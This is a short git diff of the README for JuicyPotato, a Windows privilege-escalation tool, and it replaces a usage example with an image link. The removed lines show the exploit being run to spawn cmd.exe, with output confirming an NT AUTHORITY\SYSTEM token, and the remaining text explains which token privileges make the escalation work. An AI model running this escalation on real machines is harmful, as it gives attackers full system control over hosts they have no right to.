@@ -73,20 +73,8 @@ Optional args:
 -z only test CLSID and print token's user
 ```
 
-
 ## Example
-
-```
-T:\>JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -l 31337
-
-Testing {4991d34b-80a1-4291-83b6-3328366b9097} 31337
-......
-[+] authresult 0
-{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
-
-[+] CreateProcessWithTokenW OK
-```
-
+![](assets/poc.png.png)
 
 ## Final thoughts
 If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.
